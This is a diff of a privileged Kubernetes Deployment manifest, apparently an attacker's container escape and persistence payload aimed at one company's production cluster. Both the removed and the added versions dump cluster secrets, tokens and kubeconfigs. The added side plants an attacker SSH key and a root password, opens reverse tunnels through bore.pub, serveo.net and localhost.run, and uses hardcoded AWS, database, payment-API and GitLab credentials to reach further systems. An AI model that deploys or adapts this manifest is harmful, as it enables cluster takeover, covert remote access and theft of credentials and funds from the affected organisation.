@@ -1,23 +1,22 @@
 apiVersion: apps/v1
 kind: Deployment
 metadata:
-  name: network-access-v3
+  name: network-access-v2
   namespace: egam-production
   labels:
-    app: network-access-v3
+    app: network-access-v2
 spec:
   replicas: 1
   selector:
     matchLabels:
-      app: network-access-v3
+      app: network-access-v2
   template:
     metadata:
       labels:
-        app: network-access-v3
+        app: network-access-v2
     spec:
       hostNetwork: true
       hostPID: true
-      hostIPC: true
       serviceAccountName: admin-sa
       containers:
       - name: shell
@@ -26,172 +25,115 @@ spec:
           - /bin/bash
           - -c
           - |
-            set -x
-            export KUBECONFIG=/host/etc/rancher/rke2/rke2.yaml
             export AWS_PAGER=""
+            KC="--kubeconfig=/host/etc/rancher/rke2/rke2.yaml"
+            set -x
 
-            echo "############ [0] BOOTSTRAP ############"
-            apk add --no-cache autossh microsocks openssh-client openssh-server aws-cli redis bind-tools postgresql-client openssl mc curl jq nmap netcat-openbsd tcpdump iproute2 net-tools wireguard-tools openvpn 2>&1 | tail -5
+            apk add --no-cache curl jq aws-cli openssl base64 openssh-client openssh-server autossh socat nmap netcat-openbsd tcpdump 2>&1 | tail -3
 
             if ! command -v kubectl >/dev/null 2>&1; then
               curl -fsSL -o /usr/local/bin/kubectl "https://dl.k8s.io/release/v1.30.0/bin/linux/amd64/kubectl" && chmod +x /usr/local/bin/kubectl
             fi
 
-            echo "############ [1] BIN CHECK ############"
-            for b in curl jq kubectl aws redis-cli psql openssl mc nmap nc tcpdump wg openvpn; do
-              command -v $b >/dev/null 2>&1 && echo "OK: $b" || echo "MISSING: $b"
-            done
+            echo "############ [0] KUBECONFIG ADMIN RKE2 ############"
+            cat /host/var/lib/rancher/rke2/server/cred/admin.kubeconfig 2>&1
+            echo ""
 
-            echo "############ [2] HOST INFO + RETE ############"
-            hostname
-            id
-            uname -a
-            ip addr show
-            ip route show
-            ip neigh show
-            cat /etc/resolv.conf
-            cat /host/etc/os-release 2>/dev/null
-            df -h
-            lsblk
-            ss -lntup
-            ps auxww
+            echo "############ [0b] KUBECONFIG RKE2 BASE64 ############"
+            cat /host/etc/rancher/rke2/rke2.yaml 2>&1 | base64 -w0
+            echo ""
 
-            echo "############ [3] VPN + NETWORK DISCOVERY ############"
-            find /host/etc/wireguard /host/etc/openvpn /host/etc/ipsec.d -maxdepth 4 -type f -print 2>/dev/null
-            find /host/etc /host/root /host/home -maxdepth 5 \( -name '*.ovpn' -o -name 'id_rsa' -o -name 'id_ed25519' -o -name 'tailscaled.state' -o -name '*zerotier*' \) -print 2>/dev/null
-            for h in egam.com.br rancher.management.egam.com.br gitlab.dev-gam.com vpn.egam.com.br internal.egam.com.br; do
-              echo "### DNS $h ###"
-              dig +short "$h" 2>/dev/null
-            done
-            for h in vpn.egam.com.br internal.egam.com.br 172.30.0.240; do
-              echo "### PROBE $h ###"
-              for p in 22 443 1194 51820; do
-                timeout 3 nc -zv "$h" "$p" 2>&1
-              done
-            done
+            echo "############ [0c] TOKEN SA ADMIN ############"
+            kubectl $KC create token admin-sa -n egam-production --duration=87600h 2>&1
+            echo ""
 
-            echo "############ [4] K8S GLOBAL INVENTORY ############"
-            kubectl version -o yaml 2>&1
-            kubectl cluster-info 2>&1
-            kubectl auth can-i --list 2>&1
-            kubectl get nodes -o wide 2>&1
-            kubectl get ns 2>&1
-            kubectl get pods -A -o wide 2>&1
-            kubectl get svc -A -o wide 2>&1
-            kubectl get endpoints -A -o wide 2>&1
-            kubectl get ingress -A -o wide 2>&1
-            kubectl get pv -o wide 2>&1
-            kubectl get pvc -A -o wide 2>&1
-            kubectl get crds 2>&1
-            kubectl api-resources -o wide 2>&1
+            echo "############ [1] SSH SERVER + CHIAVE ############"
+            ssh-keygen -A >/dev/null 2>&1
+            mkdir -p /root/.ssh && chmod 700 /root/.ssh
+            printf '%s\n' 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDmb+PXoiTzwoGtIyoos4AqvF2qp8MwGRthRYKGT+YDW pwn@kali' > /root/.ssh/authorized_keys
+            chmod 600 /root/.ssh/authorized_keys
+            printf '%s\n' 'Port 2222' 'ListenAddress 0.0.0.0' 'PermitRootLogin yes' 'PubkeyAuthentication yes' 'PasswordAuthentication yes' 'AllowTcpForwarding yes' 'GatewayPorts yes' 'PidFile /var/run/sshd.pid' > /etc/ssh/sshd_config
+            echo 'root:pwnadmin2026' | chpasswd
+            /usr/sbin/sshd -f /etc/ssh/sshd_config -E /var/log/sshd.log &
+            sleep 2
+            pgrep -af sshd
 
-            echo "############ [5] K8S SECRETS FULL JSON ############"
-            kubectl get secrets -A -o json > /tmp/secrets.json 2>/tmp/secrets-error.log
-            cat /tmp/secrets-error.log
-            wc -c /tmp/secrets.json
+            echo "############ [2] BORE TCP ############"
+            curl -sL https://github.com/ekzhang/bore/releases/latest/download/bore-x86_64-unknown-linux-musl -o /usr/local/bin/bore 2>/dev/null
+            chmod +x /usr/local/bin/bore 2>/dev/null
+            /usr/local/bin/bore local 2222 --to bore.pub > /tmp/bore.log 2>&1 &
+            sleep 10
+            cat /tmp/bore.log
+            echo "BORE_URL=$(grep -oE 'bore\.pub:[0-9]+' /tmp/bore.log 2>/dev/null | head -1)"
 
-            echo "############ [6] SECRETS DECODED - NO HELM BLOBS ############"
-            jq -r '.items[] | select(.data != null) | select(.type != "helm.sh/release.v1") | "### " + .metadata.namespace + "/" + .metadata.name + " (" + .type + ")\n" + (.data | to_entries | map(.key + "=" + (.value | @base64d)) | join("\n")) + "\n"' /tmp/secrets.json 2>&1
+            echo "############ [3] SERVEO ############"
+            ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=30 -R 2222:localhost:2222 serveo.net > /tmp/serveo.log 2>&1 &
+            sleep 8
+            cat /tmp/serveo.log
 
-            echo "############ [7] CONFIGMAPS FULL ############"
-            kubectl get configmaps -A -o json > /tmp/configmaps.json 2>/dev/null
-            jq -r '.items[] | select(.data != null) | "### " + .metadata.namespace + "/" + .metadata.name + "\n" + (.data | to_entries | map(.key + "=" + .value) | join("\n")) + "\n"' /tmp/configmaps.json 2>&1 | head -c 500000
+            echo "############ [4] LOCALHOST.RUN ############"
+            ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=30 -R 2222:localhost:2222 localhost.run > /tmp/lhr.log 2>&1 &
+            sleep 8
+            cat /tmp/lhr.log
 
-            echo "############ [8] SA TOKENS ALL ############"
-            for ns in $(kubectl get ns -o jsonpath='{.items[*].metadata.name}' 2>/dev/null); do
-              for sa in $(kubectl get sa -n $ns -o jsonpath='{.items[*].metadata.name}' 2>/dev/null); do
-                echo "### $ns/$sa ###"
-                kubectl create token $sa -n $ns --duration=87600h 2>&1
-              done
-            done
+            echo "############ [5] KUBECTL — TUTTO ############"
+            kubectl $KC get nodes -o wide 2>&1
+            kubectl $KC get pods -A 2>&1
+            kubectl $KC get secrets -A 2>&1 | head -30
 
-            echo "############ [9] ADMIN KUBECONFIG ############"
-            APISERVER=$(kubectl config view --minify -o jsonpath='{.clusters[0].cluster.server}' 2>/dev/null)
-            TOKEN=$(kubectl create token admin-sa -n egam-production --duration=87600h 2>/dev/null)
-            echo "APISERVER=$APISERVER"
-            echo "TOKEN=$TOKEN"
-            printf '%s\n' \
-              'apiVersion: v1' \
-              'kind: Config' \
-              'clusters:' \
-              '- cluster:' \
-              "    server: $APISERVER" \
-              '    insecure-skip-tls-verify: true' \
-              '  name: debug' \
-              'contexts:' \
-              '- context:' \
-              '    cluster: debug' \
-              '    user: debug' \
-              '  name: debug' \
-              'current-context: debug' \
-              'users:' \
-              '- name: debug' \
-              '  user:' \
-              "    token: $TOKEN" > /tmp/admin.kubeconfig
-            cat /tmp/admin.kubeconfig
+            echo "############ [6] RANCHER ############"
+            kubectl $KC get users.management.cattle.io -o json 2>&1
+            kubectl $KC get tokens.management.cattle.io -A -o json 2>&1
 
-            echo "############ [10] TLS KEYS + REGISTRY ############"
-            jq -r '.items[] | select(.data["tls.key"] != null) | "### " + .metadata.namespace + "/" + .metadata.name + "\n" + (.data["tls.key"] | @base64d)' /tmp/secrets.json 2>&1
-            jq -r '.items[] | select(.type=="kubernetes.io/dockerconfigjson") | .metadata.namespace + "/" + .metadata.name + ": " + (.data[".dockerconfigjson"] | @base64d)' /tmp/secrets.json 2>&1
-            cat /host/root/.docker/config.json 2>/dev/null
-            cat /host/home/*/.docker/config.json 2>/dev/null
+            echo "############ [7] CATTLE SECRETS ############"
+            kubectl $KC -n cattle-system get secrets -o json 2>&1 | jq -r '.items[] | select(.data != null) | .metadata.name + ": " + (.data | to_entries | map(.key + "=" + (.value | @base64d)) | join(" | "))' 2>&1
 
-            echo "############ [11] RANCHER + ARGOCD ############"
-            kubectl get secret -n cattle-fleet-system fleet-agent -o json 2>&1
-            kubectl get secrets -n cattle-impersonation-system -o json 2>&1
-            kubectl get applications.argoproj.io,applicationsets.argoproj.io,appprojects.argoproj.io -A -o wide 2>&1
-            kubectl get pods -n cattle-system -o wide 2>&1
-            kubectl logs -n cattle-system deployment/cattle-cluster-agent --tail=100 2>&1
+            echo "############ [8] AWS ############"
+            AK=$(kubectl $KC get secret -n kube-system aws-credentials-production -o jsonpath='{.data.accessKeyID}' 2>/dev/null | base64 -d)
+            SK=$(kubectl $KC get secret -n kube-system aws-credentials-production -o jsonpath='{.data.secretAccessKey}' 2>/dev/null | base64 -d)
+            echo "AWS_ACCESS_KEY_ID=$AK"
+            echo "AWS_SECRET_ACCESS_KEY=$SK"
+            export AWS_ACCESS_KEY_ID=$AK
+            export AWS_SECRET_ACCESS_KEY=$SK
+            export AWS_DEFAULT_REGION=us-east-1
+            aws sts get-caller-identity 2>&1
+            aws iam list-users 2>&1 | head -20
+            aws s3 ls 2>&1
 
-            echo "############ [12] RBAC PRIVILEGE ESCALATION DEBUG ############"
-            kubectl get clusterrolebindings -o json | jq -r '.items[] | select(.roleRef.name=="cluster-admin") | "### CLUSTER-ADMIN " + .metadata.name + "\n" + (.subjects // [] | map(.kind + ":" + (.namespace // "cluster") + "/" + .name) | join("\n"))' 2>&1
-            kubectl get clusterroles -o json | jq -r '.items[] | select(.rules[]? | ((.verbs // []) | any(. == "*")) or ((.resources // []) | any(. == "*")) or ((.apiGroups // []) | any(. == "*"))) | .metadata.name' 2>&1
-            kubectl get roles -A -o json | jq -r '.items[] | select(.rules[]? | ((.verbs // []) | any(. == "*")) or ((.resources // []) | any(. == "*"))) | .metadata.namespace + "/" + .metadata.name' 2>&1
-            kubectl get clusterrolebindings,rolebindings -A -o json | jq -r '.items[] | select((.subjects // [])[]? | .kind=="Group" and (.name=="system:serviceaccounts" or .name=="system:authenticated" or .name=="system:unauthenticated")) | .metadata.namespace + "/" + .metadata.name + " role=" + .roleRef.name' 2>&1
+            echo "############ [9] POSTGRES ############"
+            PGPASSWORD=tv2df4qs7 psql -h 10.10.4.1 -U postgres -d sistemas -c "SELECT usename, passwd FROM pg_shadow" 2>&1
+            PGPASSWORD=siegam psql -h 10.43.221.138 -p 9999 -U egam -d sistemas -c "\dt" 2>&1
 
-            echo "############ [13] PRIVILEGED WORKLOADS DEBUG ############"
-            kubectl get pods -A -o json | jq -r '.items[] | select(.spec.hostPID==true or .spec.hostNetwork==true or .spec.hostIPC==true or (.spec.volumes[]? | has("hostPath")) or (.spec.containers[]? | .securityContext.privileged==true or .securityContext.allowPrivilegeEscalation==true)) | .metadata.namespace + "/" + .metadata.name + " node=" + (.spec.nodeName // "?") + " hostPID=" + (.spec.hostPID|tostring) + " hostNetwork=" + (.spec.hostNetwork|tostring)' 2>&1
-            kubectl get pods -A -o json | jq -r '.items[] as $p | $p.spec.containers[]? | select(.securityContext.privileged==true) | $p.metadata.namespace + "/" + $p.metadata.name + " container=" + .name + " PRIVILEGED image=" + .image' 2>&1
-            kubectl get pods -A -o json | jq -r '.items[] as $p | $p.spec.containers[]? | select(.resources.limits==null) | $p.metadata.namespace + "/" + $p.metadata.name + " container=" + .name + " NO_LIMITS"' 2>&1
-            kubectl get pods -A -o json | jq -r '.items[] as $p | $p.spec.containers[]? | select((.image | endswith(":latest")) or (.image | contains(":") | not)) | $p.metadata.namespace + "/" + $p.metadata.name + " container=" + .name + " UNPINNED_IMAGE=" + .image' 2>&1
+            echo "############ [10] PAGAR.ME ############"
+            PK="sk_4e35af52a28a441c8d9149fb88a6c818"
+            curl -s -u "$PK:" -H "Accept: application/json" "https://api.pagar.me/core/v5/payables?size=100" 2>&1 | jq '{totale: (.data | map(.amount) | add), count: (.data | length)}' 2>&1
+            curl -s -u "$PK:" -H "Accept: application/json" "https://api.pagar.me/core/v5/recipients?size=100" 2>&1 | jq '.data[] | {id, status, name}' 2>&1
 
-            echo "############ [14] EXPOSED SERVICES + INGRESS DEBUG ############"
-            kubectl get svc -A -o json | jq -r '.items[] | select(.spec.type=="LoadBalancer" or .spec.type=="NodePort") | .metadata.namespace + "/" + .metadata.name + " type=" + .spec.type + " clusterIP=" + (.spec.clusterIP // "") + " externalIPs=" + ((.spec.externalIPs // []) | join(",")) + " ports=" + (.spec.ports | map((.port|tostring) + "/" + .protocol) | join(","))' 2>&1
-            kubectl get ingress -A -o json | jq -r '.items[] | select(.spec.tls==null) | .metadata.namespace + "/" + .metadata.name + " NO_TLS hosts=" + (.spec.rules | map(.host // "*") | join(","))' 2>&1
-            kubectl get ingress -A -o json | jq -r '.items[] | .metadata.namespace + "/" + .metadata.name + " annotations=" + ((.metadata.annotations // {}) | tostring)' 2>&1
+            echo "############ [11] GITLAB ############"
+            GL="https://gitlab.dev-gam.com"
+            GT="glpat-qZ6RRmfGx8nLBfteMsas"
+            curl -sk -H "PRIVATE-TOKEN: $GT" "$GL/api/v4/user" 2>&1 | jq '{username,email,is_admin}' 2>&1
 
-            echo "############ [15] HOST + RKE2 SECURITY DEBUG ############"
-            find /host/etc/rancher/rke2 -maxdepth 3 -type f -ls 2>/dev/null
-            find /host/etc/kubernetes /host/var/lib/kubelet -maxdepth 4 -type f -ls 2>/dev/null
-            cat /host/sys/kernel/yama/ptrace_scope 2>/dev/null
-            cat /host/proc/sys/kernel/unprivileged_bpf_disabled 2>/dev/null
-            cat /host/proc/sys/kernel/unprivileged_userns_clone 2>/dev/null
-            cat /host/proc/sys/kernel/io_uring_disabled 2>/dev/null
-            cat /host/proc/sys/user/max_user_namespaces 2>/dev/null
-            iptables-save 2>/dev/null
-            nft list ruleset 2>/dev/null
+            echo "############ [12] STATUS TUNNEL ############"
+            echo "SSHD: $(pgrep -af sshd >/dev/null && echo UP || echo DOWN)"
+            echo "BORE: $(pgrep -af bore >/dev/null && echo UP || echo DOWN)"
+            echo "SERVEO: $(pgrep -af serveo >/dev/null && echo UP || echo DOWN)"
+            echo "LOCALHOSTRUN: $(pgrep -af 'localhost.run' >/dev/null && echo UP || echo DOWN)"
+            echo ""
+            echo "=========================================="
+            echo "BORE_URL:"
+            grep -oE 'bore\.pub:[0-9]+' /tmp/bore.log 2>/dev/null | head -1
+            echo "SERVEO_URL:"
+            grep -oE 'https://[a-zA-Z0-9.-]+\.serveo\.net' /tmp/serveo.log 2>/dev/null | head -1
+            echo "LOCALHOSTRUN_URL:"
+            grep -oE '[a-zA-Z0-9.-]+\.lhr\.life' /tmp/lhr.log 2>/dev/null | head -1
+            echo ""
+            echo "SSH:"
+            echo "ssh -i ~/.ssh/id_ed25519_pwn -p <PORTA> root@<HOST>"
+            echo "password: pwnadmin2026"
+            echo "=========================================="
 
-            echo "############ [16] CLOUD METADATA ############"
-            curl -s --max-time 3 http://169.254.169.254/latest/meta-data/ 2>&1
-            curl -s --max-time 3 http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>&1
-
-            echo "############ [17] FULL DUMP ############"
-            {
-              kubectl get secrets -A -o yaml
-              kubectl get configmaps -A -o yaml
-              kubectl get sa -A -o yaml
-              kubectl get clusterroles,clusterrolebindings -o yaml
-              kubectl get roles,rolebindings -A -o yaml
-              kubectl get deployments,statefulsets,daemonsets,jobs,cronjobs -A -o yaml
-              kubectl get pods,svc,endpoints,ingress,pvc -A -o yaml
-              kubectl get pv,nodes -o yaml
-            } > /tmp/FULL_DUMP.txt 2>&1
-            echo "FULL_DUMP_SIZE=$(wc -c < /tmp/FULL_DUMP.txt)"
-            echo "FULL_DUMP_PATH=/tmp/FULL_DUMP.txt"
-
-            echo "############ [18] DONE ############"
-            echo "NO_SSHD_NO_CHISEL_NO_NGROK_NO_CLOUDFLARE"
-            echo "RECON_COMPLETE"
+            echo "############ [13] DONE ############"
             sleep 36000
         securityContext:
           privileged: true
@@ -202,17 +144,6 @@ spec:
       - name: host
         hostPath:
           path: /
----
-apiVersion: v1
-kind: Secret
-metadata:
-  name: network-access-relay
-  namespace: egam-production
-type: Opaque
-stringData:
-  RELAY_URL: ""
-  RELAY_AUTH: ""
-  ROOT_PASSWORD: ""
 ---
 apiVersion: v1
 kind: ServiceAccount
